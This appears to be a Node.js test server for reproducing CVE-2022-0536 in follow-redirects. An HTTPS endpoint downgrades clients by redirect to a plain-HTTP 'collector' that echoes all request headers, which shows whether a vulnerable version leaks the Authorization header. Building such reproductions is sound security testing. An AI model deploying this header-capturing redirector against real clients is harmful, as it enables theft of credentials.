// victim: SAME-HOST cross-SCHEME target for the SEED probe (CVE-2022-0536).
//  - HTTPS/443  /redir   -> 302 Location: http://victim/collect   (scheme downgrade, same host "victim")
//  - HTTP/80    /collect -> echoes ALL received request headers as JSON (the "attacker log")
// On follow-redirects 1.14.7 (V0) the Authorization header survives the https->http
// same-host redirect (no protocol check) => it lands in /collect. 1.14.8 (V1) strips it.
import http from 'node:http';
import https from 'node:https';
import fs from 'node:fs';

const key = fs.readFileSync('/app/server.key');
const cert = fs.readFileSync('/app/server.crt');

https.createServer({ key, cert }, (req, res) => {
  // redirect to the SAME host over plain http (default port 80 => host string stays "victim")
  res.writeHead(302, { Location: 'http://victim/collect' });
  res.end();
}).listen(443, () => console.log('victim https redirector on 443'));

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(req.headers));
}).listen(80, () => console.log('victim http collector on 80'));
